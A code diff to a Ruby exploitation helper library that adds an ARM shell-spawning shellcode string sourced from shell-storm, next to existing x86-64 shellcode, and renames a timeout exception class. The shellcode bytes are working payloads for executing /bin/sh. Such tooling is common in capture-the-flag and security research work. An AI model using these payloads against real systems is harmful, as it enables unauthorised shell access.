@@ -31,9 +31,14 @@ class PwnLib
         # http://shell-storm.org/shellcode/files/shellcode-806.php
         "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
     end
+
+    def self.shellcode_arm
+        # http://shell-storm.org/shellcode/files/shellcode-698.php
+        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+    end
 end
 
-class TimeoutError < IOError
+class PwnLib::TimeoutError < IOError
 end
 
 class PwnTube
@@ -81,7 +86,7 @@ class PwnTube
 
     def recv(size = 8192, timeout = nil)
         if IO.select([@socket], [], [], timeout) == nil
-            raise TimeoutError.new
+            raise PwnLib::TimeoutError.new
         end
         @socket.recv(size).tap{|a| log ">> #{a.inspect}" if @debug}
     end
